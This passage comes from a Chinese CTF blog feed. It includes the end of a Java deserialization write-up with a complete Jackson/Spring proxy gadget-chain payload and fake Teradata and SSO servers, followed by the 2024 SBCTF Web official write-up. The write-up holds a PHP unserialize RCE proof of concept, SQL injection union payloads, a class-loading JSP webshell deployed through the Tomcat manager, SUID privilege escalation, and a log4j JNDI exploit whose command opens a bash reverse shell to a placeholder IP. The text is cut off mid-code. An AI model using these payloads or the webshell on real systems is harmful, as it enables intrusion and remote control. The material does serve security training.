class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span>port<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">handle_accept</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        pair <span class="token operator">=</span> self<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> pair <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            sock<span class="token punctuation">,</span> addr <span class="token operator">=</span> pair            handler <span class="token operator">=</span> teradata_request_handler<span class="token punctuation">(</span>sock<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token string">"http://&lt;server_ip>:5555/a"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    logging<span class="token punctuation">.</span>basicConfig<span class="token punctuation">(</span>level<span class="token operator">=</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>    server <span class="token operator">=</span> TeradataServer<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">10250</span><span class="token punctuation">)</span>    asyncore<span class="token punctuation">.</span>loop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>然后启用一个 fakesso server ，用于返回  openid-configuration 格式的 json</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># Script fakesso.py from Vidar-Team 1ue</span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token keyword">import</span> jsonapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/a"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/a/.well-known/openid-configuration"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">h</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    dddata<span class="token operator">=</span><span class="token punctuation">&#123;</span>        <span class="token string">"authorization_endpoint"</span><span class="token punctuation">:</span><span class="token string">"1ue"</span><span class="token punctuation">,</span>        <span class="token string">"token_endpoint"</span><span class="token punctuation">:</span><span class="token string">"vidar"</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>dddata<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">5555</span><span class="token punctuation">)</span></code></pre><p>由于漏洞说明中仅给出了基于 CommonBeanutil 链的绕过高版本方法，因此我们需要手动构造 Jackson 链来调用 TeradataSource 的 getter 方法触发连接</p><p>首先是 dataSource 部分的构造：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> command <span class="token operator">=</span> <span class="token string">"calc.exe"</span><span class="token punctuation">;</span><span class="token class-name">TeraDataSource</span> dataSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TeraDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dataSource<span class="token punctuation">.</span><span class="token function">setBROWSER</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>dataSource<span class="token punctuation">.</span><span class="token function">setLOGMECH</span><span class="token punctuation">(</span><span class="token string">"BROWSER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dataSource<span class="token punctuation">.</span><span class="token function">setDSName</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dataSource<span class="token punctuation">.</span><span class="token function">setDbsPort</span><span class="token punctuation">(</span><span class="token string">"10250"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>首先尝试了 <code>BadAttributeValueExpException.toString -&gt; POJONode -&gt; jackson反序列化-&gt;getter</code></p><p>但是实测 <code>BadAttributeValueExpException</code> 触发 <code>toString</code> 只能在 Java 8 中成功触发，而在 Java 17 中无法使用，因此需要寻找其他 from readObject to obj.toString 路径链：</p><p><a href="https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/util/PayloadHelper.java#L311">https://github.com/wh1t3p1g/ysomap/blob/master/core/src/main/java/ysomap/core/util/PayloadHelper.java#L311</a></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">EventListenerList</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventListenerList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">UndoManager</span> manager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UndoManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Vector</span> vector <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Vector</span><span class="token punctuation">)</span> <span class="token class-name">ReflectionHelper</span><span class="token punctuation">.</span><span class="token function">getFieldValue</span><span class="token punctuation">(</span>manager<span class="token punctuation">,</span> <span class="token string">"edits"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ReflectionHelper</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> <span class="token string">"listenerList"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">InternalError</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> manager<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>如果直接使用上述链子，在 jackson 链在循环调用 getter 时会由于顺序问题导致反序列化触发失败：</p><pre class="language-java" data-language="java"><code class="language-java">getter definitions <span class="token keyword">for</span> property <span class="token string">"databaseName"</span><span class="token operator">:</span> <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>teradata<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span>TeraDataSourceBase</span>#<span class="token function">getdatabaseName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> vs <span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>teradata<span class="token punctuation">.</span>jdbc<span class="token punctuation">.</span></span>TeraDataSourceBase</span>#<span class="token function">getDatabaseName</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>需要使用 <code>org.springframework.aop.framework.JdkDynamicAopProxy</code> 类代理解决：</p><blockquote><p>JdkDynamicAopProxy 类的 advised 成员是 <code>org.springframework.aop.framework.AdvisedSupport</code> 类型的对象，它的 targetSource 成员中保存了 JdkDynamicAopProxy 类代理的接口的实现类</p></blockquote><blockquote><p>当代理类上的一个接口方法被调用时，这个 <code>handler</code> 就会尝试调用 <code>targetSource</code> 成员保存的实现类对象所实现的对应方法。所以需要获取代理类所有的 <code>getter</code> 方法，然后调用代理的 <code>getter</code> 方法，触发 JdkDynamicAopProxy 类的 <code>invoke</code> 方法</p></blockquote><blockquote><p>同时应该注意到，当我们使用反射获取一个代理类上的所有方法时，只能获取到其代理的接口方法，我们的目的应该是让代理类仅仅包含我们需要的方法 <code>getConnection()</code> 来触发 jdbc 连接</p></blockquote><p><img src="image-16.png" alt="image-16.png"></p><p>由于 DataSource 代理类包含我们需要的 <code>getConnection()</code> 方法，因此我们可以使用这个代理类来稳定触发反序列化：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">AdvisedSupport</span> advisedSupport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>advisedSupport<span class="token punctuation">.</span><span class="token function">setTarget</span><span class="token punctuation">(</span>dataSource<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">AdvisedSupport</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>advisedSupport<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> proxy <span class="token operator">=</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">DataSource</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>最终 Payload：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token comment">// Teradata 恶意 dataSource 构造</span><span class="token class-name">String</span> command <span class="token operator">=</span> <span class="token string">"calc.exe"</span><span class="token punctuation">;</span><span class="token class-name">TeraDataSource</span> dataSource <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TeraDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dataSource<span class="token punctuation">.</span><span class="token function">setBROWSER</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>dataSource<span class="token punctuation">.</span><span class="token function">setLOGMECH</span><span class="token punctuation">(</span><span class="token string">"BROWSER"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dataSource<span class="token punctuation">.</span><span class="token function">setDSName</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dataSource<span class="token punctuation">.</span><span class="token function">setDbsPort</span><span class="token punctuation">(</span><span class="token string">"10250"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 代理类实现稳定触发 getConnection</span><span class="token class-name">AdvisedSupport</span> advisedSupport <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AdvisedSupport</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>advisedSupport<span class="token punctuation">.</span><span class="token function">setTarget</span><span class="token punctuation">(</span>dataSource<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Constructor</span> constructor <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.springframework.aop.framework.JdkDynamicAopProxy"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token class-name">AdvisedSupport</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">InvocationHandler</span> handler <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">InvocationHandler</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>advisedSupport<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> proxy <span class="token operator">=</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">DataSource</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 删除 writeReplace 解决 Jackson 反序列化不稳定问题</span><span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.fasterxml.jackson.databind.node.BaseJsonNode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtMethod</span> writeReplace <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"writeReplace"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctClass<span class="token punctuation">.</span><span class="token function">removeMethod</span><span class="token punctuation">(</span>writeReplace<span class="token punctuation">)</span><span class="token punctuation">;</span>ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">POJONode</span> node <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">POJONode</span><span class="token punctuation">(</span>proxy<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// jdk17 从 readObject 到 obj.toString 构造</span><span class="token class-name">EventListenerList</span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EventListenerList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">UndoManager</span> manager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UndoManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Vector</span> vector <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Vector</span><span class="token punctuation">)</span> <span class="token class-name">ReflectionHelper</span><span class="token punctuation">.</span><span class="token function">getFieldValue</span><span class="token punctuation">(</span>manager<span class="token punctuation">,</span> <span class="token string">"edits"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ReflectionHelper</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> <span class="token string">"listenerList"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">InternalError</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> manager<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token function">serial</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 SBCTF Web Official WriteUp</title>
      <link href="/write-up/2024-sbctf-web-official-writeup/"/>
      <url>/write-up/2024-sbctf-web-official-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="比赛介绍"><a href="#比赛介绍" class="headerlink" title="比赛介绍"></a>比赛介绍</h1><blockquote><p>2024 SBCTF 是由吉林大学 Spirit 战队和中国矿业大学 BXS 战队合办的网络安全寒假训练赛，<br>我们鼓励有志于加入 Spirit 未来一同参加比赛的同学参加本次训练赛，<br>本次比赛难度会每周递增，帮助 0 基础同学入门，也会让有基础的同学有所收获，<br>我们会根据本次比赛表现择优选拔一些同学加入 Spirit。<br>比赛时间：2024.1.15 09:00 ~ 2024.2.11 22:00，共4周</p></blockquote><h1 id="比赛概况"><a href="#比赛概况" class="headerlink" title="比赛概况"></a>比赛概况</h1><p>本次 2024 SBCTF 大赛吸引了来自吉林大学、中国矿业大学、大连理工大学、东北大学、中山大学、西安电子科技大学、南京理工大学、南京邮电大学、南京航空航天大学、杭州电子科技大学等众多院校的共计百余名选手参与，在激烈的竞争中产生了前 10 名表现优异的选手：</p><p><img src="image-1.jpg" alt="image-1.jpg"></p><blockquote><p>作为本次比赛的 Web 出题人 和 平台运维人 ，非常感谢大家本次前来参加与支持 SBCTF 比赛！</p></blockquote><h1 id="Week1-php-hacker"><a href="#Week1-php-hacker" class="headerlink" title="Week1 - php_hacker"></a>Week1 - php_hacker</h1><p>简单的 php <code>__wakeup()</code> 魔术方法 反序列化</p><h2 id="1-POC"><a href="#1-POC" class="headerlink" title="1. POC"></a>1. POC</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Executor</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$command</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">command</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 创建 Executor 实例</span><span class="token variable">$executor</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Executor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$executor</span><span class="token operator">-></span><span class="token property">command</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"system(\"&lt;command>\");"</span><span class="token punctuation">;</span> <span class="token comment">// PHP 代码</span><span class="token comment">// 序列化对象</span><span class="token variable">$serializedData</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$executor</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Base64 编码</span><span class="token variable">$encodedData</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$serializedData</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$encodedData</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>Executor</code> 类在被反序列化时会调用 class 的 <code>__wakeup</code> 方法，<br>从而可以构造 <code>serailized payload</code> 实现 RCE</p><h2 id="2"><a href="#2" class="headerlink" title="2. &lt;command&gt;"></a>2. &lt;command&gt;</h2><p><code>ls</code> 之后发现 flag 在 &#x2F;f_l_a_g 里，于是 <code>cat /f_l_a_g</code> 获得 flag</p><p>ps：这题直接丢给 ChatGPT 好像能直接帮你做完，不亏是 Week1 难度</p><h1 id="Week1-attack-shiro"><a href="#Week1-attack-shiro" class="headerlink" title="Week1 - attack_shiro"></a>Week1 - attack_shiro</h1><p>根据题目名称提示找到工具 <a href="https://github.com/SummerSec/ShiroAttack2/releases">ShiroAttack2</a></p><h2 id="1-爆破-shiro-密钥"><a href="#1-爆破-shiro-密钥" class="headerlink" title="1. 爆破 shiro 密钥"></a>1. 爆破 shiro 密钥</h2><img src="image-2.png" alt="image-2.png" width="60%" /><h2 id="2-爆破反序列化利用链及回显方式"><a href="#2-爆破反序列化利用链及回显方式" class="headerlink" title="2. 爆破反序列化利用链及回显方式"></a>2. 爆破反序列化利用链及回显方式</h2><img src="image-3.png" alt="image-3.png" width="60%" /><h2 id="3-RCE"><a href="#3-RCE" class="headerlink" title="3. RCE"></a>3. RCE</h2><img src="image-4.png" alt="image-4.png" width="60%" /><p>传说中的 3s 出，不知道为什么没人做 …</p><h1 id="Week1-ez-sqli"><a href="#Week1-ez-sqli" class="headerlink" title="Week1 - ez_sqli"></a>Week1 - ez_sqli</h1><p>简单的 无waf sql手注<br>由于前后端数据交互进行了两次 base64 加密和解密<br>所以没办法用 sqlmap 一把梭</p><blockquote><p>虽然理论上可以搞一个 py tamper 脚本<br>但那样难道不比直接手注复杂 (?)</p></blockquote><h2 id="1-登录界面（-login）"><a href="#1-登录界面（-login）" class="headerlink" title="1. 登录界面（&#x2F;login）"></a>1. 登录界面（&#x2F;login）</h2><p>由于攻击方不知道对方服务器的数据表名，我们需要先获取数据库名：</p><pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">-- </span></code></pre><p>接着获取目标敏感数据的列名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token string">'union select 1,group_concat(column_name),1 from information_schema.columns where table_schema=database() and table_name='</span>secrets' <span class="token comment">-- </span></code></pre><p>最后获取 flag</p><pre class="language-sql" data-language="sql"><code class="language-sql">'<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>secret_info<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">from</span> secrets <span class="token comment">-- </span></code></pre><p><img src="image-5.png" alt="image-5.png" width="50%" align = "left" /> <br><br><br><br></p><h2 id="2-搜索界面（-search）"><a href="#2-搜索界面（-search）" class="headerlink" title="2. 搜索界面（&#x2F;search）"></a>2. 搜索界面（&#x2F;search）</h2><p>同理 两边注入点等效 不具体解释</p><pre class="language-none"><code class="language-none">&#39;union select 1,1,group_concat(table_name),1 from information_schema.tables where table_schema&#x3D;database() -- </code></pre> <pre class="language-none"><code class="language-none">&#39;union select 1,1,group_concat(column_name),1 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;secrets&#39; -- </code></pre> <pre class="language-none"><code class="language-none">&#39;union select 1,1,group_concat(secret_info),1 from secrets -- </code></pre><img src="image-6.png" alt="image-6.png" width = 40% /><h1 id="Week1-ez-cat"><a href="#Week1-ez-cat" class="headerlink" title="Week1 - ez_cat"></a>Week1 - ez_cat</h1><p>Tomcat 后台 通过 war 包上传 jsp shell<br>suid perm 使用 &#x2F;usr&#x2F;bin&#x2F;date 提权 读取 &#x2F;flag</p><h2 id="1-Tomcat-后台-jsp-shell-上传"><a href="#1-Tomcat-后台-jsp-shell-上传" class="headerlink" title="1. Tomcat 后台 jsp shell 上传"></a>1. Tomcat 后台 jsp shell 上传</h2><p><img src="image-7.png" alt="image-7.png"></p><p>点击 <code>Manager App</code> ，使用 Jerry 提示的密码 <code>admin:admin</code> 进入Tomcat 后台</p><p>构造 <code>shell.jsp</code> 如下：</p><pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%!    class U extends ClassLoader &#123;        U(ClassLoader c) &#123;            super(c);        &#125;        public Class g(byte[] b) &#123;            return super.defineClass(b, 0, b.length);        &#125;    &#125;     public byte[] base64Decode(String str) throws Exception &#123;        try &#123;            Class clazz &#x3D; Class.forName(&quot;sun.misc.BASE64Decoder&quot;);            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);        &#125; catch (Exception e) &#123;            Class clazz &#x3D; Class.forName(&quot;java.util.Base64&quot;);            Object decoder &#x3D; clazz.getMethod(&quot;getDecoder&quot;).invoke(null);            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);        &#125;    &#125;%&gt;&lt;%    String cls &#x3D; request.getParameter(&quot;passwd&quot;);    if (cls !&#x3D; null) &#123;        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);    &#125;%&gt;</code></pre><p>打包成 <code>shell.war</code></p><pre class="language-none"><code class="language-none">jar -cvf shell.war shell.jsp</code></pre><p>上传至 Tomcat 后台</p><img src="image-8.png" alt="image-8.png" width="80%" /><p>使用 中国蚁剑 连接 shell：</p><img src="image-9.png" alt="image-9.png" width="60%" /><h2 id="2-suid-perm-使用-date-提权"><a href="#2-suid-perm-使用-date-提权" class="headerlink" title="2. suid perm 使用 date 提权"></a>2. suid perm 使用 date 提权</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token function">date</span> <span class="token parameter variable">-f</span> /flag.txt</code></pre><p>根据回显得到 flag</p><h1 id="Week1-java-signin"><a href="#Week1-java-signin" class="headerlink" title="Week1 - java_signin"></a>Week1 - java_signin</h1><blockquote><p>原题来自 NCTF 2023 - logging<br><a href="https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#logging">https://exp10it.io/2023/12/nctf-2023-web-official-writeup/#logging</a></p></blockquote><p>考点是在 log4j2 默认配置下触发 <code>CVE-2021-44228</code> RCE</p><p>使用工具：</p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit">welk1n&#x2F;JNDI-Injection-Exploit: JNDI注入测试工具（A tool which generates JNDI links can start several servers to exploit JNDI Injection vulnerability,like Jackson,Fastjson,etc） (github.com)</a></p><p>Server Bash run：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-C</span> <span class="token string">"bash -c &#123;echo,x&#125;(x: 'bash -i >&amp; /dev/tcp/ip/port 0>&amp;1' encoded with base64)|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> <span class="token parameter variable">-A</span> <span class="token operator">&lt;</span>server_ip<span class="token operator">></span>:<span class="token operator">&lt;</span>listen_port<span class="token operator">></span></code></pre><p>在 <code>/</code> 处的 Request 的 Accept Header 中注入 jndi，触发报错日志记录，</p><pre class="language-markup" data-language="markup"><code class="language-markup">$&#123;jndi:rmi://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>server_ip</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rmi_port</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ramdom_rmi_route</span><span class="token punctuation">></span></span>&#125;</code></pre><p>log4j2 远程加载 Class 类 反弹 Shell 获得 flag</p><h1 id="Week2-ez-spring"><a href="#Week2-ez-spring" class="headerlink" title="Week2 - ez_spring"></a>Week2 - ez_spring</h1><blockquote><p>本题最早可以追溯到 2022 UIUCTF - web&#x2F;spoink<br>后在 2023 第七届强网杯中被用作强网先锋题（签到题）<br>本来是拿来当作 Week2 Web 的签到题的，但没想到解数这么少…<br>由于强网杯没有也不会对签到题放出 Hint，因此本题也没有放 Hint</p></blockquote><p>考点是 CVE-2022-37767: Pebble 3.1.5 RCE</p><p>和强网杯原题一样，在放出的附件中没有给出 waf 内容<br>在远程靶机中屏蔽了一些类关键词，可以用字符串拼接绕过</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StringFilter</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token class-name">String</span> context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>context<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"org.springframework.context.support.ClassPathXmlApplicationContext"</span><span class="token punctuation">)</span> <span class="token operator">||</span> context      <span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"java.beans.Beans"</span><span class="token punctuation">)</span> <span class="token operator">||</span> context    